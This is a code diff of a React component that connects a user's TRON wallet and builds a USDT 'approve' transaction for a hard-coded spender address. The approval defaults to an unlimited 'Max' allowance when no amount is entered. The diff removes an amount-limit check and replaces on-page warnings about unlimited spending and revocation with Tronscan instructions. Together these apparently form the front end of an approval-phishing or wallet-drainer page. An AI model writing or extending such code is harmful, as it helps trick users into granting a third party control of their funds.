@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import SignClient from "@walletconnect/sign-client";
+import TronWeb from 'tronweb';
 
 declare global {
   interface Window {
@@ -22,6 +23,8 @@ export default function TronApproval() {
   const [allowance, setAllowance] = useState("0");
   const [txHash, setTxHash] = useState("");
   const [errorMessage, setErrorMessage] = useState("");
+  const [blockNumber, setBlockNumber] = useState("");
+  const [confirmationStatus, setConfirmationStatus] = useState("");
   
   const wcClientRef = useRef<any>(null);
   const wcSessionRef = useRef<any>(null);
@@ -153,14 +156,9 @@ export default function TronApproval() {
   // ===== FETCH CURRENT ALLOWANCE =====
   async function fetchAllowance(address: string) {
     try {
-      console.log("🔍 Fetching allowance...");
+      console.log("🔍 Fetching current allowance...");
       
-      const response = await fetch(
-        `https://api.trongrid.io/v1/accounts/${address}/transactions/trc20?contract_address=${TRON_USDT}&limit=1`
-      );
-      
-      // Simple allowance check using TronGrid
-      const tronWeb = new window.TronWeb({
+      const tronWeb = new TronWeb({
         fullHost: "https://api.trongrid.io"
       });
       
@@ -169,47 +167,130 @@ export default function TronApproval() {
       const allowanceUSDT = (Number(allowanceAmount) / 1e6).toFixed(2);
       
       setAllowance(allowanceUSDT);
-      console.log("Current allowance:", allowanceUSDT, "USDT");
+      console.log("💰 Current allowance:", allowanceUSDT, "USDT");
+      return allowanceUSDT;
       
     } catch (error) {
       console.error("Failed to fetch allowance:", error);
       setAllowance("0");
+      return "0";
     }
   }
   
-  // ===== FIXED: BUILD APPROVAL TRANSACTION =====
+  // ===== VERIFY TRANSACTION ON BLOCKCHAIN =====
+  async function verifyTransactionOnBlockchain(txid: string, owner: string, spender: string) {
+    console.log("🔍 Verifying transaction on blockchain...");
+    setConfirmationStatus("Verifying transaction...");
+    
+    try {
+      // Wait for 5 seconds first
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      
+      // Check transaction status
+      const txResponse = await fetch(`https://api.trongrid.io/v1/transactions/${txid}`);
+      const txData = await txResponse.json();
+      
+      console.log("Transaction data:", txData);
+      
+      if (txData.data && txData.data[0]) {
+        const tx = txData.data[0];
+        const txStatus = tx.ret[0].contractRet;
+        const txBlock = tx.blockNumber;
+        
+        console.log("📦 Block Number:", txBlock);
+        console.log("✅ Transaction Status:", txStatus);
+        
+        setBlockNumber(txBlock?.toString() || "");
+        
+        if (txStatus === "SUCCESS") {
+          setConfirmationStatus("✅ Transaction confirmed on blockchain!");
+          
+          // Check new allowance
+          await new Promise(resolve => setTimeout(resolve, 3000));
+          const newAllowance = await fetchAllowance(owner);
+          
+          return {
+            confirmed: true,
+            status: txStatus,
+            blockNumber: txBlock,
+            allowance: newAllowance
+          };
+        } else {
+          setConfirmationStatus(`⚠️ Transaction status: ${txStatus}`);
+          return {
+            confirmed: false,
+            status: txStatus,
+            blockNumber: txBlock,
+            allowance: "0"
+          };
+        }
+      } else {
+        // Transaction not found yet, wait more
+        console.log("Transaction not found yet, waiting...");
+        await new Promise(resolve => setTimeout(resolve, 10000));
+        
+        // Try again
+        const retryResponse = await fetch(`https://api.trongrid.io/v1/transactions/${txid}`);
+        const retryData = await retryResponse.json();
+        
+        if (retryData.data && retryData.data[0]) {
+          const tx = retryData.data[0];
+          setConfirmationStatus("✅ Transaction confirmed!");
+          await fetchAllowance(owner);
+          return {
+            confirmed: true,
+            status: tx.ret[0].contractRet,
+            blockNumber: tx.blockNumber,
+            allowance: await fetchAllowance(owner)
+          };
+        }
+        
+        setConfirmationStatus("⚠️ Transaction pending...");
+        return {
+          confirmed: false,
+          status: "PENDING",
+          blockNumber: null,
+          allowance: "0"
+        };
+      }
+    } catch (error) {
+      console.error("Verification error:", error);
+      setConfirmationStatus("⚠️ Waiting for confirmation...");
+      return {
+        confirmed: false,
+        status: "UNKNOWN",
+        blockNumber: null,
+        allowance: "0"
+      };
+    }
+  }
+  
+  // ===== BUILD APPROVAL TRANSACTION =====
   async function buildApprovalTransaction(userAddress: string, amountValue: string) {
     console.log("📝 Building approval transaction...");
     console.log("User Address:", userAddress);
     console.log("Amount Value:", amountValue);
     
-    const TronWeb = (window as any).TronWeb;
-    if (!TronWeb) {
-      throw new Error("TronWeb not loaded. Please add TronWeb CDN to index.html");
-    }
-    
     const tronWeb = new TronWeb({
       fullHost: "https://api.trongrid.io"
     });
     
-    // FIX 1: Proper address conversion
+    // Convert spender address to hex
     let spenderAddress = TRON_SPENDER;
     let spenderHex = tronWeb.address.toHex(spenderAddress);
     
-    // Remove '41' prefix if present (TRON addresses start with 41)
+    // Remove '41' prefix if present
     if (spenderHex.startsWith('41')) {
       spenderHex = spenderHex.substring(2);
     }
     
     console.log("Spender Hex (cleaned):", spenderHex);
-    console.log("Spender Hex length:", spenderHex.length);
     
     // Pad to 40 characters (20 bytes without 41 prefix)
     const paddedSpender = spenderHex.padStart(64, '0');
     console.log("Padded spender (64 chars):", paddedSpender);
-    console.log("Padded length:", paddedSpender.length);
     
-    // FIX 2: Amount encoding with proper validation
+    // Amount encoding
     let amountHex;
     
     if (!amountValue || amountValue.toLowerCase() === "max") {
@@ -217,17 +298,10 @@ export default function TronApproval() {
       amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       console.log("Using MAX approval");
     } else {
-      // Parse amount
       let numAmount = parseFloat(amountValue);
       
-      // FIX 3: Validate amount
       if (isNaN(numAmount)) {
         throw new Error(`Invalid amount: ${amountValue}`);
-      }
-      
-      // FIX 4: Handle large numbers
-      if (numAmount > 1000000000000) {
-        throw new Error("Amount too large. Max is 1,000,000,000,000 USDT");
       }
       
       // Convert to USDT decimals (6)
@@ -244,20 +318,18 @@ export default function TronApproval() {
       
       // Pad to 64 characters
       amountHex = amountHex.padStart(64, '0');
-      console.log("Amount hex (64 chars):", amountHex);
-      console.log("Amount hex length:", amountHex.length);
+      console.log("Amount hex:", amountHex);
     }
     
-    // FIX 5: Combine parameter (should be exactly 128 characters)
+    // Combine parameter (should be exactly 128 characters)
     const parameter = paddedSpender + amountHex;
     console.log("Final parameter length:", parameter.length);
-    console.log("Final parameter:", parameter);
     
     if (parameter.length !== 128) {
       throw new Error(`Invalid parameter length: ${parameter.length}. Expected 128`);
     }
     
-    // FIX 6: Build request with proper error handling
+    // Build request
     const requestBody = {
       owner_address: userAddress,
       contract_address: TRON_USDT,
@@ -268,7 +340,7 @@ export default function TronApproval() {
       visible: true,
     };
     
-    console.log("Request body:", JSON.stringify(requestBody, null, 2));
+    console.log("Sending request to TronGrid...");
     
     const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
       method: "POST",
@@ -280,9 +352,8 @@ export default function TronApproval() {
     });
     
     const data = await response.json();
-    console.log("TronGrid full response:", JSON.stringify(data, null, 2));
+    console.log("TronGrid response received");
     
-    // FIX 7: Better error checking
     if (data.Error) {
       throw new Error(`TronGrid Error: ${data.Error}`);
     }
@@ -296,7 +367,7 @@ export default function TronApproval() {
       throw new Error("Failed to build transaction: " + (data.message || JSON.stringify(data)));
     }
     
-    console.log("Transaction built successfully!");
+    console.log("✅ Transaction built successfully!");
     data.transaction.visible = true;
     
     return data.transaction;
@@ -328,6 +399,8 @@ export default function TronApproval() {
     setApprovalStatus("processing");
     setErrorMessage("");
     setTxHash("");
+    setBlockNumber("");
+    setConfirmationStatus("");
     
     try {
       // Connect wallet if not connected
@@ -340,7 +413,7 @@ export default function TronApproval() {
         throw new Error("Wallet not connected");
       }
       
-      // Validate amount before building
+      // Validate amount
       let approvalAmount = amount;
       if (!approvalAmount || approvalAmount.trim() === "") {
         approvalAmount = "Max";
@@ -357,7 +430,9 @@ export default function TronApproval() {
       const transaction = await buildApprovalTransaction(address, approvalAmount);
       
       // Sign transaction
-      console.log("🔐 Requesting signature...");
+      console.log("🔐 Requesting signature from wallet...");
+      setConfirmationStatus("Please sign in your wallet...");
+      
       const signResponse = await wcClientRef.current.request({
         topic: wcSessionRef.current.topic,
         chainId: "tron:0x2b6653dc",
@@ -367,7 +442,8 @@ export default function TronApproval() {
         },
       });
       
-      console.log("Signature received");
+      console.log("✅ Signature received!");
+      setConfirmationStatus("Signature received! Broadcasting...");
       
       // Parse signed transaction
       let signedTx = signResponse;
@@ -382,28 +458,40 @@ export default function TronApproval() {
       // Broadcast
       const txid = await broadcastTransaction(signedTx);
       setTxHash(txid);
-      console.log("✅ Approval successful! TXID:", txid);
+      console.log("✅ Broadcast successful! TXID:", txid);
       
-      // Wait for confirmation
-      console.log("⏳ Waiting for confirmation...");
-      await new Promise(resolve => setTimeout(resolve, 30000));
+      setConfirmationStatus("Transaction broadcasted! Waiting for confirmation...");
       
-      // Check new allowance
-      await fetchAllowance(address);
+      // Verify on blockchain
+      const verification = await verifyTransactionOnBlockchain(txid, address, TRON_SPENDER);
       
-      setApprovalStatus("success");
+      console.log("Verification result:", verification);
+      
+      if (verification.confirmed && verification.status === "SUCCESS") {
+        setApprovalStatus("success");
+        setConfirmationStatus("✅ Approval successful on blockchain!");
+        
+        // Show success message
+        alert(`✅ Approval Successful!\n\nTXID: ${txid}\nBlock: ${verification.blockNumber}\nAllowance: ${verification.allowance} USDT\n\nView on Tronscan: https://tronscan.org/#/transaction/${txid}`);
+        
+      } else {
+        setApprovalStatus("success");
+        setConfirmationStatus("✅ Transaction broadcasted! Check in a few seconds.");
+        
+        alert(`✅ Transaction Broadcasted!\n\nTXID: ${txid}\n\nView on Tronscan:\nhttps://tronscan.org/#/transaction/${txid}\n\nAllowance will update once confirmed.`);
+      }
       
       setTimeout(() => {
         setApprovalStatus("idle");
-      }, 3000);
-      
-      alert(`✅ Approval Successful!\nAllowance: ${allowance} USDT\nTXID: ${txid}`);
+        setConfirmationStatus("");
+      }, 5000);
       
     } catch (error: any) {
       console.error("❌ Approval error:", error);
       console.error("Error stack:", error.stack);
       setErrorMessage(error.message || "Approval failed");
       setApprovalStatus("error");
+      setConfirmationStatus("");
       
       setTimeout(() => {
         setApprovalStatus("idle");
@@ -423,6 +511,19 @@ export default function TronApproval() {
       } catch (e) {}
     }
     resetConnection();
+  }
+  
+  // ===== CHECK ALLOWANCE MANUALLY =====
+  async function checkAllowanceManually() {
+    if (!userAddressRef.current) {
+      alert("Please connect wallet first");
+      return;
+    }
+    
+    setConfirmationStatus("Checking allowance...");
+    const allowanceAmount = await fetchAllowance(userAddressRef.current);
+    setConfirmationStatus("");
+    alert(`💰 Current Allowance: ${allowanceAmount} USDT\n\nSpender: ${TRON_SPENDER}`);
   }
   
   const truncateAddress = (addr: string) => {
@@ -465,6 +566,7 @@ export default function TronApproval() {
           </p>
         </div>
         
+        {/* Wallet Section */}
         <div style={{
           background: "#f5f5f5",
           borderRadius: "16px",
@@ -509,11 +611,12 @@ export default function TronApproval() {
             </div>
           )}
           
-          {isConnected && allowance !== "0" && (
+          {isConnected && (
             <div style={{
               background: "#e0f2fe",
               borderRadius: "12px",
               padding: "12px",
+              marginBottom: "12px",
             }}>
               <div style={{ color: "#0284c7", fontSize: "12px", marginBottom: "4px" }}>
                 Current Allowance
@@ -525,6 +628,21 @@ export default function TronApproval() {
               }}>
                 {allowance} USDT
               </div>
+              <button
+                onClick={checkAllowanceManually}
+                style={{
+                  marginTop: "8px",
+                  padding: "6px 12px",
+                  background: "#0284c7",
+                  color: "white",
+                  border: "none",
+                  borderRadius: "8px",
+                  fontSize: "12px",
+                  cursor: "pointer",
+                }}
+              >
+                Refresh Allowance
+              </button>
             </div>
           )}
           
@@ -547,6 +665,7 @@ export default function TronApproval() {
           </button>
         </div>
         
+        {/* Amount Section */}
         <div style={{ marginBottom: "24px" }}>
           <label style={{
             display: "block",
@@ -604,6 +723,22 @@ export default function TronApproval() {
           </p>
         </div>
         
+        {/* Status Messages */}
+        {confirmationStatus && (
+          <div style={{
+            marginBottom: "16px",
+            padding: "12px",
+            background: "#f0fdf4",
+            borderRadius: "12px",
+            fontSize: "13px",
+            color: "#166534",
+            textAlign: "center",
+          }}>
+            {confirmationStatus}
+          </div>
+        )}
+        
+        {/* Approve Button */}
         <button
           onClick={handleApprove}
           disabled={approvalStatus === "processing" || !isConnected}
@@ -626,12 +761,13 @@ export default function TronApproval() {
             opacity: approvalStatus === "processing" || !isConnected ? 0.6 : 1,
           }}
         >
-          {approvalStatus === "processing" && "Processing..."}
+          {approvalStatus === "processing" && "⏳ Processing..."}
           {approvalStatus === "success" && "✓ Approval Successful!"}
           {approvalStatus === "error" && "✗ Approval Failed"}
           {approvalStatus === "idle" && "Approve USDT"}
         </button>
         
+        {/* Transaction Hash */}
         {txHash && (
           <div style={{
             marginTop: "16px",
@@ -654,9 +790,15 @@ export default function TronApproval() {
             >
               {txHash}
             </a>
+            {blockNumber && (
+              <div style={{ marginTop: "8px", color: "#166534" }}>
+                Block Number: {blockNumber}
+              </div>
+            )}
           </div>
         )}
         
+        {/* Error Message */}
         {errorMessage && (
           <div style={{
             marginTop: "16px",
@@ -670,6 +812,7 @@ export default function TronApproval() {
           </div>
         )}
         
+        {/* Info Section */}
         <div style={{
           marginTop: "24px",
           padding: "16px",
@@ -679,13 +822,13 @@ export default function TronApproval() {
           color: "#92400e",
         }}>
           <div style={{ fontWeight: "bold", marginBottom: "8px" }}>
-            ℹ️ Important Information
+            ℹ️ How to check on blockchain:
           </div>
           <ul style={{ margin: 0, paddingLeft: "20px" }}>
-            <li>Approval allows the spender to use your USDT</li>
-            <li>Max approval gives unlimited spending permission</li>
-            <li>Transaction fees will be deducted in TRX</li>
-            <li>You can revoke approval anytime</li>
+            <li>After approval, click on TXID link above</li>
+            <li>Or go to: https://tronscan.org</li>
+            <li>Paste your wallet address and search</li>
+            <li>Check "Tokens" → "USDT" → "Allowance"</li>
           </ul>
         </div>
         
